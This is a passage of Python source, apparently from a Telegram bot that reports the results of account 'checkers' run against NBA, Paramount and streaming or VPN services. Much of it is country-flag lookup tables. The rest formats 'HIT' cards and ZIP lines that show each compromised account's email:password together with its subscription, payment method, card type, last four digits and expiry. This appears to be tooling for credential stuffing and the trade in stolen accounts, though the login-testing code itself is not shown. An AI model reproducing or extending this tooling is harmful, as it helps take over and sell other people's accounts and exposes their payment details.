    "SN": "🇸🇳", "SC": "🇸🇨", "SL": "🇸🇱", "SI": "🇸🇮", "SB": "🇸🇧", "SO": "🇸🇴", "SS": "🇸🇸",
    "LK": "🇱🇰", "SD": "🇸🇩", "SR": "🇸🇷", "SZ": "🇸🇿", "SY": "🇸🇾", "TJ": "🇹🇯", "TZ": "🇹🇿",
    "TL": "🇹🇱", "TG": "🇹🇬", "TO": "🇹🇴", "TT": "🇹🇹", "TN": "🇹🇳", "TM": "🇹🇲", "TV": "🇹🇻",
    "UG": "🇺🇬", "UY": "🇺🇾", "UZ": "🇺🇿", "VU": "🇻🇺", "VE": "🇻🇪", "YE": "🇾🇪", "ZM": "🇿🇲",
    "ZW": "🇿🇼",
}

def country_flag(code_or_name):
    if not code_or_name or code_or_name in ("N/A", "None", ""):
        return ""
    s = str(code_or_name).strip().upper()
    if len(s) == 2 and s in COUNTRY_FLAGS:
        return COUNTRY_FLAGS[s]
    # try reverse lookup by name
    for cc, flag in COUNTRY_FLAGS.items():
        if s == cc:
            return flag
    # partial name match
    name_map = {
        "UNITED STATES": "US", "UNITED KINGDOM": "GB", "GERMANY": "DE", "FRANCE": "FR",
        "SPAIN": "ES", "ITALY": "IT", "TURKEY": "TR", "BRAZIL": "BR", "JAPAN": "JP",
        "SOUTH KOREA": "KR", "INDIA": "IN", "CANADA": "CA", "AUSTRALIA": "AU",
        "MEXICO": "MX", "NETHERLANDS": "NL", "SWEDEN": "SE", "NORWAY": "NO",
        "DENMARK": "DK", "FINLAND": "FI", "POLAND": "PL", "RUSSIA": "RU",
        "ARGENTINA": "AR", "CHILE": "CL", "COLOMBIA": "CO", "PERU": "PE",
        "UAE": "AE", "SAUDI ARABIA": "SA", "EGYPT": "EG", "SOUTH AFRICA": "ZA",
        "INDONESIA": "ID", "MALAYSIA": "MY", "SINGAPORE": "SG", "THAILAND": "TH",
        "VIETNAM": "VN", "PHILIPPINES": "PH", "PORTUGAL": "PT", "ROMANIA": "RO",
        "HUNGARY": "HU", "CZECH": "CZ", "UKRAINE": "UA", "AUSTRIA": "AT",
        "SWITZERLAND": "CH", "BELGIUM": "BE", "ISRAEL": "IL", "TAIWAN": "TW",
        "HONG KONG": "HK", "PAKISTAN": "PK", "NEW ZEALAND": "NZ",
    }
    for name, cc in name_map.items():
        if name in s:
            return COUNTRY_FLAGS.get(cc, "")
    return ""

def format_country(val):
    """Premium flag + ISO code. If no premium flag id, show code only (no simple flag)."""
    if not val or str(val).strip().upper() in ("N/A", "NONE", "", "-", "UNKNOWN", "NA"):
        return "-"
    s = str(val).strip()
    cc = resolve_country_code(s)
    fl = flag_emoji(cc or s)
    if fl and cc:
        return f"{fl} <code>{cc}</code>"
    if fl:
        return f"{fl} <code>{s}</code>"
    if cc:
        return f"<code>{cc}</code>"
    return f"<code>{s}</code>"



# ==================== PREMIUM FLAG EMOJIS ====================
FLAG_EMOJI_IDS = {
    "US": "5913463998522592692",
    "UA": "5911406692007941050",
    "PL": "5913550391789752571",
    "KZ": "5913724621433082323",
    "CN": "5913779335021466780",
    "AZ": "5911197578640233518",
    "EU": "5911106310585193018",
    "AM": "5913272455866093666",
    "RU": "5913274246867456342",
    "UZ": "5911051846104912282",
    "DE": "5911096835887337583",
    "JP": "5913293711659241040",
    "TR": "5910995113881901195",
    "BY": "5911011185649521599",
    "GB": "5913443365499703513",
    "IN": "5913754823643107921",
    "BR": "5911148568768418614",
    "ZM": "5913564754160389778",
    "YE": "5913346492512341993",
    "VN": "5913428887164949581",
    "VA": "5911211932420938860",
    "VU": "5913511535220625585",
    "UY": "5913623088406204470",
    "AE": "5913726554168365343",
    "UG": "5913488939397681980",
    "TM": "5913315521503170180",
    "TN": "5911332947419468671",
    "TT": "5911228635548750294",
    "TG": "5913423260757790970",
    "TH": "5913617968805187987",
    "TZ": "5911418949844603556",
    "TJ": "5911287639809463107",
    "CH": "5913271227505448072",
    "SE": "5911156510162949403",
    "SZ": "5913374525763883286",
    "SR": "5913275539652611719",
    "SD": "5911387497799094470",
    "ES": "5911193287967904547",
    "LK": "5911293163137406640",
    "SS": "5911406262511211744",
    "KR": "5913371673905598425",
    "ZA": "5911203119148044594",
    "SO": "5911397852965244436",
    "SB": "5911482712929080608",
    "SI": "5913431983836368644",
    "SK": "5913751666842145020",
    "SG": "5911531460808051849",
    "SL": "5911210450657218661",
    "SC": "5911185183364616913",
    "RS": "5913592598433369871",
    "SN": "5910995302860461643",
    "SA": "5911300687920108242",
    "ST": "5913574331937462345",
    "SM": "5913587968458625465",
    "WS": "5913325971158602854",
    "KN": "5913691898077253637",
    "VC": "5911318941531116255",
    "LC": "5911243659344351824",
    "PS": "5913684768431541668",
    "RW": "5911455229433352234",
    "RO": "5913460373570195273",
    "QA": "5911260864983339619",
    "PR": "5911504350974317480",
    "PT": "5911023653939581472",
    "PH": "5911268638874145162",
    "PE": "5911207993935925780",
    "PY": "5911014265141072316",
    "PG": "5911107251183030903",
    "PA": "5913428968769327174",
    "PW": "5911283903187915549",
    "PK": "5913705895375672082",
    "OM": "5913570801474343473",
    "NO": "5913617397574537046",
    "NG": "5911143844304393105",
    "NE": "5911270086278124251",
    "NZ": "5913640044937089340",
    "NL": "5913367645226275100",
    "NP": "5913496520014958723",
    "NA": "5911108535378252443",
    "MZ": "5911333419865871464",
    "MA": "5911482111633658301",
    "ME": "5913239436157522151",
    "MN": "5911041383564580038",
    "MC": "5911245347266500057",
    "MD": "5913456847402045950",
    "FM": "5911271104185373336",
    "MX": "5913687302462246518",
    "MU": "5913291113204027321",
    "MH": "5913235935759175692",
    "MT": "5911023714069123567",
    "ML": "5911305266355245916",
    "MV": "5913501399097806832",
    "MY": "5913654360063087453",
    "KE": "5911154710571651231",
    "MG": "5913766918271012920",
    "MK": "5913394029210374721",
    "LU": "5913390842344640293",
    "LT": "5911172315642597775",
    "LI": "5911166650580734660",
    "LY": "5911236989260140996",
    "LR": "5913324167272337727",
    "LS": "5911059881988723711",
    "LB": "5911504273664905447",
    "LV": "5913738489882480243",
    "LA": "5913718526874489279",
    "KG": "5911202161370337549",
    "KW": "5913290705182134003",
    "XK": "5911433681582429010",
    "KI": "5911294443037660118",
    "JO": "5913234136167878475",
    "JM": "5913232280742006526",
    "IE": "5913427959452012488",
    "IT": "5913688444923547525",
    "IL": "5911471936856134692",
    "IQ": "5911382442622587735",
    "IR": "5911308891307643032",
    "ID": "5913479361620611038",
    "IS": "5911047899029967246",
    "HU": "5913767635530551104",
    "HN": "5911406889576436289",
    "HT": "5913459789454643194",
    "GY": "5913579412883771480",
    "GW": "5911398694778836149",
    "GN": "5913471858312744319",
    "GT": "5913324858762072330",
    "GD": "5913228063084121946",
    "GR": "5911210399117611448",
    "GH": "5913391155877252952",
    "GE": "5913434771270144023",
    "GM": "5913657267755945883",
    "GA": "5911037896051137264",
    "FR": "5913605586414473124",
    "FI": "5911041344909873378",
    "FJ": "5911393832875856716",
    "ET": "5911078333168227043",
    "EE": "5910986042910969906",
    "GQ": "5911306279967529251",
    "SV": "5913238624408703010",
    "EG": "5913694831539916769",
    "EC": "5911273865849347408",
    "TL": "5911141915864076479",
    "DO": "5911152099231536123",
    "DM": "5911377121158107430",
    "DJ": "5911407709915190157",
    "DK": "5911206009661034712",
    "CY": "5911023550860366409",
    "HR": "5913692684056269311",
    "CR": "5911261745451635030",
    "CG": "5911338788574990168",
    "CD": "5913770362834783827",
    "KM": "5911338582416560604",
    "CO": "5913773060074246009",
    "CL": "5911470957603592832",
    "CZ": "5911198691036764307",
    "TD": "5913299849167507310",
    "CF": "5913443245240619222",
    "CV": "5913571501554012193",
    "CA": "5913623736946265914",
    "CM": "5911172109484167745",
    "KH": "5913699998385573485",
    "BI": "5913766441529642752",
    "BF": "5913407764515786948",
    "BG": "5911263776971168517",
    "BN": "5911336409163109113",
    "BW": "5911513782722499475",
    "BA": "5913700002680541032",
    "BO": "5913638795101606133",
    "BT": "5913236734623093021",
    "BJ": "5913735869952430547",
    "BZ": "5913355005137522807",
    "BE": "5913529642802745141",
    "BB": "5911016996740272263",
    "BD": "5911365056594973179",
    "BH": "5913581663446634403",
    "BS": "5911451643135660214",
    "AT": "5911338831524664592",
    "AU": "5913632326880858455",
    "AR": "5913573356979884082",
    "AG": "5913389025573475085",
    "AO": "5913753316109586411",
    "AD": "5911314702398396902",
    "DZ": "5913782968563800236",
    "AL": "5911357458797826163",
    "AF": "5913492040364068694",
    "ZW": "5911092502265336396",
    "UK": "5913443365499703513",
}

UNICODE_FLAGS = {
    "US": "🇺🇸",
    "UA": "🇺🇦",
    "PL": "🇵🇱",
    "KZ": "🇰🇿",
    "CN": "🇨🇳",
    "AZ": "🇦🇿",
    "EU": "🇪🇺",
    "AM": "🇦🇲",
    "RU": "🇷🇺",
    "UZ": "🇺🇿",
    "DE": "🇩🇪",
    "JP": "🇯🇵",
    "TR": "🇹🇷",
    "BY": "🇧🇾",
    "GB": "🇬🇧",
    "IN": "🇮🇳",
    "BR": "🇧🇷",
    "VN": "🇻🇳",
    "AE": "🇦🇪",
    "TH": "🇹🇭",
    "CH": "🇨🇭",
    "SE": "🇸🇪",
    "ES": "🇪🇸",
    "KR": "🇰🇷",
    "ZA": "🇿🇦",
    "SG": "🇸🇬",
    "SA": "🇸🇦",
    "RO": "🇷🇴",
    "QA": "🇶🇦",
    "PT": "🇵🇹",
    "PH": "🇵🇭",
    "PE": "🇵🇪",
    "PK": "🇵🇰",
    "OM": "🇴🇲",
    "NO": "🇳🇴",
    "NG": "🇳🇬",
    "NZ": "🇳🇿",
    "NL": "🇳🇱",
    "NP": "🇳🇵",
    "MX": "🇲🇽",
    "MY": "🇲🇾",
    "KE": "🇰🇪",
    "IT": "🇮🇹",
    "IL": "🇮🇱",
    "IE": "🇮🇪",
    "IQ": "🇮🇶",
    "IR": "🇮🇷",
    "ID": "🇮🇩",
    "HU": "🇭🇺",
    "GR": "🇬🇷",
    "GH": "🇬🇭",
    "FR": "🇫🇷",
    "FI": "🇫🇮",
    "EG": "🇪🇬",
    "DK": "🇩🇰",
    "CZ": "🇨🇿",
    "CA": "🇨🇦",
    "BG": "🇧🇬",
    "BE": "🇧🇪",
    "BD": "🇧🇩",
    "AT": "🇦🇹",
    "AU": "🇦🇺",
    "AR": "🇦🇷",
    "AF": "🇦🇫",
    "UK": "🇬🇧",
    "HK": "🇭🇰",
    "TW": "🇹🇼",
    "CL": "🇨🇱",
    "CO": "🇨🇴",
    "CR": "🇨🇷",
    "CU": "🇨🇺",
    "DO": "🇩🇴",
}



# Full country-name / alias → ISO2 for premium flags
COUNTRY_NAME_TO_CC = {
    "UNITED STATES": "US", "USA": "US", "AMERICA": "US", "UNITED STATES OF AMERICA": "US",
    "UNITED KINGDOM": "GB", "UK": "GB", "GREAT BRITAIN": "GB", "ENGLAND": "GB",
    "INDIA": "IN", "BHARAT": "IN",
    "GERMANY": "DE", "DEUTSCHLAND": "DE",
    "FRANCE": "FR", "CANADA": "CA", "AUSTRALIA": "AU", "BRAZIL": "BR", "BRASIL": "BR",
    "JAPAN": "JP", "CHINA": "CN", "RUSSIA": "RU", "RUSSIAN FEDERATION": "RU",
    "MEXICO": "MX", "SPAIN": "ES", "ITALY": "IT", "NETHERLANDS": "NL", "HOLLAND": "NL",
    "POLAND": "PL", "TURKEY": "TR", "TÜRKIYE": "TR", "TURKIYE": "TR",
    "UKRAINE": "UA", "KAZAKHSTAN": "KZ", "UZBEKISTAN": "UZ", "AZERBAIJAN": "AZ",
    "ARMENIA": "AM", "BELARUS": "BY", "PAKISTAN": "PK", "BANGLADESH": "BD",
    "INDONESIA": "ID", "MALAYSIA": "MY", "SINGAPORE": "SG", "THAILAND": "TH",
    "VIETNAM": "VN", "PHILIPPINES": "PH", "SOUTH KOREA": "KR", "KOREA": "KR",
    "NORTH KOREA": "KP", "SAUDI ARABIA": "SA", "UAE": "AE", "UNITED ARAB EMIRATES": "AE",
    "EGYPT": "EG", "NIGERIA": "NG", "SOUTH AFRICA": "ZA", "ARGENTINA": "AR",
    "CHILE": "CL", "COLOMBIA": "CO", "PERU": "PE", "SWEDEN": "SE", "NORWAY": "NO",
    "DENMARK": "DK", "FINLAND": "FI", "SWITZERLAND": "CH", "AUSTRIA": "AT",
    "BELGIUM": "BE", "PORTUGAL": "PT", "GREECE": "GR", "ROMANIA": "RO",
    "CZECHIA": "CZ", "CZECH REPUBLIC": "CZ", "HUNGARY": "HU", "IRELAND": "IE",
    "ISRAEL": "IL", "NEW ZEALAND": "NZ", "HONG KONG": "HK", "TAIWAN": "TW",
    "QATAR": "QA", "KUWAIT": "KW", "OMAN": "OM", "BAHRAIN": "BH",
    "MOROCCO": "MA", "KENYA": "KE", "GHANA": "GH", "ETHIOPIA": "ET",
    "NEPAL": "NP", "SRI LANKA": "LK", "MYANMAR": "MM", "CAMBODIA": "KH",
    "EUROPE": "EU", "EUROPEAN UNION": "EU",
}


def resolve_country_code(val):
    """Normalize any country input to ISO2 or empty."""
    if val is None:
        return ""
    s = str(val).strip()
    if not s or s.upper() in ("N/A", "NA", "NONE", "NULL", "UNKNOWN", "-"):
        return ""
    # already ISO2
    if len(s) == 2 and s.isalpha():
        return s.upper()
    # ISO3 common
    iso3 = {
        "USA": "US", "GBR": "GB", "IND": "IN", "DEU": "DE", "FRA": "FR", "CAN": "CA",
        "AUS": "AU", "BRA": "BR", "JPN": "JP", "CHN": "CN", "RUS": "RU", "MEX": "MX",
        "ESP": "ES", "ITA": "IT", "NLD": "NL", "POL": "PL", "TUR": "TR", "UKR": "UA",
        "PAK": "PK", "BGD": "BD", "IDN": "ID", "MYS": "MY", "SGP": "SG", "THA": "TH",
        "VNM": "VN", "PHL": "PH", "KOR": "KR", "SAU": "SA", "ARE": "AE", "EGY": "EG",
        "NGA": "NG", "ZAF": "ZA", "ARG": "AR", "SWE": "SE", "NOR": "NO", "DNK": "DK",
        "FIN": "FI", "CHE": "CH", "AUT": "AT", "BEL": "BE", "PRT": "PT", "GRC": "GR",
        "ROU": "RO", "CZE": "CZ", "HUN": "HU", "IRL": "IE", "ISR": "IL", "NZL": "NZ",
    }
    u = s.upper().replace(".", "").strip()
    if u in iso3:
        return iso3[u]
    if u in COUNTRY_NAME_TO_CC:
        return COUNTRY_NAME_TO_CC[u]
    # partial contains
    for name, cc in COUNTRY_NAME_TO_CC.items():
        if name in u or u in name:
            return cc
    return ""



def resolve_country_code(val):
    """Normalize any country input to ISO2 or empty."""
    if val is None:
        return ""
    s = str(val).strip()
    if not s or s.upper() in ("N/A", "NA", "NONE", "NULL", "UNKNOWN", "-"):
        return ""
    if len(s) == 2 and s.isalpha():
        return s.upper()
    iso3 = {
        "USA": "US", "GBR": "GB", "IND": "IN", "DEU": "DE", "FRA": "FR", "CAN": "CA",
        "AUS": "AU", "BRA": "BR", "JPN": "JP", "CHN": "CN", "RUS": "RU", "MEX": "MX",
        "ESP": "ES", "ITA": "IT", "NLD": "NL", "POL": "PL", "TUR": "TR", "UKR": "UA",
        "PAK": "PK", "BGD": "BD", "IDN": "ID", "MYS": "MY", "SGP": "SG", "THA": "TH",
        "VNM": "VN", "PHL": "PH", "KOR": "KR", "SAU": "SA", "ARE": "AE", "EGY": "EG",
        "NGA": "NG", "ZAF": "ZA", "ARG": "AR", "SWE": "SE", "NOR": "NO", "DNK": "DK",
        "FIN": "FI", "CHE": "CH", "AUT": "AT", "BEL": "BE", "PRT": "PT", "GRC": "GR",
        "ROU": "RO", "CZE": "CZ", "HUN": "HU", "IRL": "IE", "ISR": "IL", "NZL": "NZ",
    }
    u = s.upper().replace(".", "").strip()
    if u in iso3:
        return iso3[u]
    if "COUNTRY_NAME_TO_CC" in globals() and u in COUNTRY_NAME_TO_CC:
        return COUNTRY_NAME_TO_CC[u]
    # built-in mini map if name map missing
    mini = {
        "UNITED STATES": "US", "USA": "US", "UNITED KINGDOM": "GB", "UK": "GB",
        "INDIA": "IN", "GERMANY": "DE", "FRANCE": "FR", "CANADA": "CA", "AUSTRALIA": "AU",
        "BRAZIL": "BR", "JAPAN": "JP", "CHINA": "CN", "RUSSIA": "RU", "MEXICO": "MX",
        "SPAIN": "ES", "ITALY": "IT", "NETHERLANDS": "NL", "POLAND": "PL", "TURKEY": "TR",
        "UKRAINE": "UA", "PAKISTAN": "PK", "BANGLADESH": "BD", "INDONESIA": "ID",
        "MALAYSIA": "MY", "SINGAPORE": "SG", "THAILAND": "TH", "VIETNAM": "VN",
        "PHILIPPINES": "PH", "SOUTH KOREA": "KR", "SAUDI ARABIA": "SA", "UAE": "AE",
        "UNITED ARAB EMIRATES": "AE", "EGYPT": "EG", "NIGERIA": "NG", "SOUTH AFRICA": "ZA",
        "ARGENTINA": "AR", "SWEDEN": "SE", "NORWAY": "NO", "DENMARK": "DK", "FINLAND": "FI",
        "SWITZERLAND": "CH", "AUSTRIA": "AT", "BELGIUM": "BE", "PORTUGAL": "PT",
        "GREECE": "GR", "ROMANIA": "RO", "IRELAND": "IE", "ISRAEL": "IL", "NEW ZEALAND": "NZ",
    }
    if u in mini:
        return mini[u]
    for name, cc in list(mini.items()) + list(COUNTRY_NAME_TO_CC.items() if "COUNTRY_NAME_TO_CC" in globals() else []):
        if name in u or u in name:
            return cc
    return ""


def flag_emoji(code):
    """Premium tg-emoji flag ONLY. No simple unicode flag."""
    if not code:
        return ""
    cc = resolve_country_code(code) or str(code).strip().upper()
    if len(cc) != 2 or not cc.isalpha():
        return ""
    eid = FLAG_EMOJI_IDS.get(cc) if "FLAG_EMOJI_IDS" in globals() else None
    if not eid:
        return ""  # no premium id → no simple flag
    # glyph still needed inside tg-emoji tag for clients that don't resolve custom emoji
    glyph = ""
    if "UNICODE_FLAGS" in globals():
        glyph = UNICODE_FLAGS.get(cc) or ""
    if not glyph:
        try:
            glyph = "".join(chr(0x1F1E6 + ord(c) - ord("A")) for c in cc)
        except Exception:
            glyph = cc
    return f'<tg-emoji emoji-id="{eid}">{glyph}</tg-emoji>'



def format_country(val):
    """Premium flag + ISO code for hit cards."""
    if not val or str(val).strip().upper() in ("N/A", "NONE", "", "-", "UNKNOWN", "NA"):
        return "-"
    s = str(val).strip()
    cc = resolve_country_code(s)
    fl = flag_emoji(cc or s)
    if fl and cc:
        return f"{fl} {cc}"
    if fl:
        return f"{fl} {s}"
    if cc:
        return cc
    return s





def format_zip_style_hit(email, password, result, checker_name="Checker"):
    """Same field layout as TXT lines inside result ZIP — used for Telegram HIT messages."""
    r = result or {}
    status = str(r.get("status", "")).lower()
    cname = (checker_name or "").lower()

    def s(v):
        if v is None or v == "":
            return "-"
        v = str(v).strip()
        if v.upper() in ("N/A", "NONE", "NULL", "UNKNOWN"):
            return "-"
        return v

    # Prefer explicit line from checker
    for key in ("zip_line", "file_line", "hit_line"):
        if r.get(key):
            return str(r[key]).strip()

    country = format_country(r.get("country") or r.get("cc") or "")

    # NBA zip-style
    if "nba" in cname or r.get("league_pass") is not None:
        return (
            f"{email}:{password} | "
            f"Status:{s(r.get('sub_status') or r.get('message') or status)} | "
            f"Plan:{s(r.get('plan'))} | "
            f"Price:{s(r.get('price'))} | "
            f"Renewal:{s(r.get('renewal_bool') if r.get('renewal_bool') is not None else r.get('auto_renew'))} | "
            f"Start:{s(r.get('start_date'))} | "
            f"NextPay:{s(r.get('next_payment') or r.get('next_billing'))} | "
            f"Pay:{s(r.get('payment') or r.get('payment_type'))} | "
            f"Card:{s(r.get('card_type'))} | "
            f"Last4:{s(r.get('card_last4'))} | "
            f"Expiry:{s(r.get('expires') or r.get('card_expiry'))} | "
            f"Country:{country} | "
            f"LP:{s(r.get('league_pass'))} | "
            f"by {CONTACT_ADMIN}"
        )

    # Paramount zip-style (matches original format_hit_line)
    if "paramount" in cname:
        return (
            f"{email}:{password} | "
            f"Status:{s(r.get('package_status') or r.get('message') or status)} | "
            f"Plan:{s(r.get('plan') or r.get('plan_base'))} | "
            f"Tier:{s(r.get('tier') or r.get('plan_base'))} | "
            f"Price:{s(r.get('price'))} | "
            f"Trial:{s(r.get('on_trial'))} | "
            f"Subscriber:{s(r.get('is_subscriber'))} | "
            f"AdFree:{s(r.get('ad_free'))} | "
            f"Country:{country} | "
            f"Payment:{s(r.get('payment'))} | "
            f"Card:{s(r.get('card_type'))} | "
            f"Last4:{s(r.get('card_last4'))} | "
            f"Card Expiry:{s(r.get('card_expiry'))} | "
            f"Account Expiry:{s(r.get('expires'))} | "
            f"Kids:{s(r.get('kids'))} | "
            f"by {CONTACT_ADMIN}"
        )

    # Generic streaming / VPN zip-style
    return (
        f"{email}:{password} | "
        f"Status:{s(r.get('message') or status)} | "
        f"Plan:{s(r.get('plan') or r.get('premium_type') or r.get('offer_name'))} | "
        f"Streams:{s(r.get('streams') or r.get('max_stream') or r.get('device_limit'))} | "
        f"NextBill:{s(r.get('next_billing') or r.get('renewal'))} | "
        f"AutoRenew:{s(r.get('auto_renew'))} | "
        f"Expiry:{s(r.get('expires') or r.get('expiration_date'))} | "
        f"Country:{country} | "
        f"Payment:{s(r.get('payment') or r.get('payment_method'))} | "
        f"User:{s(r.get('user') or r.get('username'))} | "
        f"by {CONTACT_ADMIN}"
    )


def format_hit_card(email, password, result, checker_name="Checker"):
    """Telegram HIT card: emojis on main sentences + same data as zip line."""
    r = result or {}
    status = str(r.get("status", "")).lower()
    is_hit = status in ("premium", "hit", "valid", "success")
    is_free = status in ("free", "expired")
    cname = (checker_name or "").lower()

    if is_hit:
        head = f"{E('success')} <b>HIT</b> — {checker_name} {E('gem')}"
    elif is_free:
        head = f"{E('unlock')} <b>FREE</b> — {checker_name} {E('star')}"
    else:
        head = f"{E('warn')} <b>{status.upper()}</b> — {checker_name}"

    zip_line = format_zip_style_hit(email, password, result, checker_name)
    # multi-line pretty card using same fields
    # If checker supplied hit_text with structure, prefer repairing country flag only
    native = r.get("hit_text") or r.get("formatted") or r.get("card")
    if isinstance(native, str) and native.strip() and "\n" in native:
        txt = native.strip()
        # ensure premium country
        cc_raw = r.get("country") or r.get("cc") or ""
        if cc_raw:
            pretty = format_country(cc_raw)
            txt = re.sub(
                r'(Country\s*[➜:=]\s*)([^\n<]+)',
                lambda m: m.group(1) + pretty,
                txt,
                count=1,
                flags=re.I,
            )
        if not txt.startswith(E("success")) and not txt.startswith(E("unlock")):
            txt = head + "\n\n" + txt
        return txt

    country = format_country(r.get("country") or r.get("cc") or "")

    def line(emoji_key, label, value):
        v = value
        if v is None or str(v).strip() == "":
            return None
        vs = str(v).strip()
        if vs.upper() in ("N/A", "NONE", "-", "NULL", "UNKNOWN"):
            return None
        return f"{E(emoji_key)} <b>{label}</b> ➜ {vs}"

    rows = [head, "", f"{E('mail')} <b>Account</b> ➜ <code>{email}:{password}</code>"]

    if "nba" in cname or r.get("league_pass") is not None:
        fields = [
            ("ok1", "Status", r.get("sub_status") or r.get("message") or status),
            ("spark", "Plan", r.get("plan")),
            ("cash", "Price", r.get("price")),
            ("bolt", "Renewal", r.get("renewal_bool") if r.get("renewal_bool") is not None else r.get("auto_renew")),
            ("cal", "StartDate", r.get("start_date")),
            ("cal2", "NextPay", r.get("next_payment") or r.get("next_billing")),
            ("card", "Payment", r.get("payment") or r.get("payment_type")),
            ("card", "Card", r.get("card_type")),
            ("pin", "Last4", r.get("card_last4")),
            ("time", "Expiry", r.get("expires") or r.get("card_expiry")),
            ("world", "Country", country),
            ("star", "LP", r.get("league_pass")),
        ]
    elif "paramount" in cname:
        fields = [
            ("ok1", "Status", r.get("package_status") or r.get("message") or status),
            ("spark", "Plan", r.get("plan") or r.get("plan_base")),
            ("star", "Tier", r.get("tier") or r.get("plan_base")),
            ("cash", "Price", r.get("price")),
            ("bolt", "Trial", r.get("on_trial")),
            ("success", "Subscriber", r.get("is_subscriber")),
            ("fire", "AdFree", r.get("ad_free")),
            ("world", "Country", country),
            ("card", "Payment", r.get("payment")),
            ("card", "Card", r.get("card_type")),
            ("pin", "Last4", r.get("card_last4")),
            ("time", "Card Expiry", r.get("card_expiry")),
            ("cal", "Account Expiry", r.get("expires")),
            ("teddy", "Kids", r.get("kids")),
        ]
    else:
        fields = [
            ("ok1", "Status", r.get("message") or status),
            ("spark", "Plan", r.get("plan") or r.get("premium_type") or r.get("offer_name")),
            ("bolt", "Streams", r.get("streams") or r.get("max_stream") or r.get("device_limit")),
            ("cal", "Next Billing", r.get("next_billing") or r.get("renewal")),
            ("fire", "Auto Renew", r.get("auto_renew")),
            ("time", "Expiry", r.get("expires") or r.get("expiration_date")),
            ("world", "Country", country),
            ("card", "Payment", r.get("payment") or r.get("payment_method")),
            ("robot", "User", r.get("user") or r.get("username")),
        ]

    for ek, lab, val in fields:
        # Country already formatted
        if lab == "Country":
            if country and country != "-":
                rows.append(f"{E('world')} <b>Country</b> ➜ {country}")
            continue
        ln = line(ek, lab, val)
        if ln:
            rows.append(ln)

    rows += ["", f"{E('crown')} <b>Made By</b> ➜ {CONTACT_ADMIN}"]
    rows += ["", f"{E('file')} <code>{zip_line}</code>"]
    return "\n".join(rows)



def format_hit_message(email, password, result, checker_name="Checker", rotations=1):
    """HIT card — same data as ZIP line, premium flags, emojis on main lines."""
    try:
        return format_hit_card(email, password, result, checker_name)
    except Exception:
        pass
    r = result or {}

    # Prefer checker-native card but still ensure country has premium flag if missing
    for key in ("hit_text", "formatted", "format", "card", "display"):
        native = r.get(key)
        if isinstance(native, str) and native.strip():
            txt = native.strip()
            # inject/repair Country line flag if plain country code present without tg-emoji
            cc_raw = r.get("country") or r.get("cc") or ""
            if cc_raw and "Country" in txt and "tg-emoji" not in txt.split("Country")[-1][:80]:
                pretty = format_country(cc_raw)
                txt = re.sub(
                    r'(<b>Country</b>\s*[➜=]\s*)([^\n<]+)',
                    lambda m: m.group(1) + pretty,
                    txt,
                    count=1,
                    flags=re.I,
                )
            return txt

    status = str(r.get("status", "")).lower()
    is_hit = status in ("premium", "hit", "valid", "success")
    is_free = status in ("free", "expired")

    if is_hit:
        title = f"{E('success')} <b>HIT</b> — {checker_name} {E('gem')}"
    elif is_free:
        title = f"{E('unlock')} <b>FREE</b> — {checker_name} {E('star')}"
    else:
        title = f"{E('warn')} <b>{status.upper()}</b> — {checker_name} {E('dot')}"

    cname = (checker_name or "").lower()

    # NBA-native layout
    if cname in ("nba", "nba tv", "nba checker") or r.get("league_pass") is not None:
        plan = clean_val(r.get("plan"))
        sub_status = clean_val(r.get("sub_status") or r.get("message") or status.upper())
        price = clean_val(r.get("price"))
        renewal = r.get("renewal_bool") or r.get("auto_renew") or "-"
        if isinstance(renewal, bool):
            renewal = "true" if renewal else "false"
        start_date = clean_val(r.get("start_date"))
        next_pay = clean_val(r.get("next_payment") or r.get("next_billing"))
        pay_method = clean_val(r.get("payment") or r.get("payment_type"))
        card_type = clean_val(r.get("card_type"))
        last4 = clean_val(r.get("card_last4"))
        expiry = clean_val(r.get("card_expiry") or r.get("expires"))
        country = format_country(r.get("country") or "")
        lp = r.get("league_pass")
        lp_s = "Yes" if lp in (True, "Yes", "yes") else ("No" if lp in (False, "No", "no") else clean_val(lp, "No"))
        lines = [
            title,
            "",
            f"{E('mail')} <b>Account</b> ➜ <code>{email}:{password}</code>",
            f"{E('ok1')} <b>subscriptionStatus</b> = {sub_status}",
            f"{E('spark')} <b>Subscription Name</b> = {plan}",
            f"{E('cash')} <b>Price</b> = {price}",
            f"{E('bolt')} <b>Renowal</b> = {clean_val(renewal)}",
            f"{E('cal')} <b>StartDate</b> = {start_date}",
            f"{E('cal2')} <b>Next Payement</b> = {next_pay}",
            f"{E('card')} <b>Payement Method</b> = {pay_method}",
            f"{E('card')} <b>cardType</b> = {card_type}",
            f"{E('pin')} <b>Last 4</b> = {last4}",
            f"{E('time')} <b>ExpiryDate</b> = {expiry}",
            f"{E('world')} <b>Country</b> = {country}",
            f"{E('star')} <b>LP</b> = {lp_s}",
            "",
            f"{E('crown')} <b>Made By</b> ➜ {CONTACT_ADMIN}",
        ]
        filtered = []
        for ln in lines:
            if not ln:
                filtered.append(ln); continue
            low = ln.lower()
            if (" = -" in low or " = n/a" in low) and "account" not in low and "made by" not in low and "lp" not in low:
                continue
            filtered.append(ln)
        return "\n".join(filtered)

    # Paramount layout
    if "paramount" in cname:
        country = format_country(r.get("country") or "")
        lines = [
            title,
            "",
            f"{E('mail')} <b>Account</b> ➜ <code>{email}:{password}</code>",
            f"{E('ok1')} <b>Status</b> ➜ {clean_val(r.get('package_status') or r.get('message') or status)}",
            f"{E('spark')} <b>Plan</b> ➜ {clean_val(r.get('plan') or r.get('plan_base'))}",
            f"{E('star')} <b>Tier</b> ➜ {clean_val(r.get('plan_base') or r.get('tier'))}",
            f"{E('cash')} <b>Price</b> ➜ {clean_val(r.get('price'))}",
            f"{E('bolt')} <b>Trial</b> ➜ {clean_val(r.get('on_trial'))}",
            f"{E('success')} <b>Subscriber</b> ➜ {clean_val(r.get('is_subscriber'))}",
            f"{E('fire')} <b>AdFree</b> ➜ {clean_val(r.get('ad_free'))}",
            f"{E('world')} <b>Country</b> ➜ {country}",
            f"{E('card')} <b>Payment</b> ➜ {clean_val(r.get('payment'))}",
            f"{E('card')} <b>Card</b> ➜ {clean_val(r.get('card_type'))}",
            f"{E('pin')} <b>Last4</b> ➜ {clean_val(r.get('card_last4'))}",
            f"{E('time')} <b>Card Expiry</b> ➜ {clean_val(r.get('card_expiry') or r.get('expires'))}",
            f"{E('cal')} <b>Account Expiry</b> ➜ {clean_val(r.get('expires'))}",
            f"{E('teddy')} <b>Kids</b> ➜ {clean_val(r.get('kids'))}",
            "",
            f"{E('crown')} <b>Made By</b> ➜ {CONTACT_ADMIN}",
        ]
        filtered = []
        for ln in lines:
            if not ln:
                filtered.append(ln); continue
            low = ln.lower()
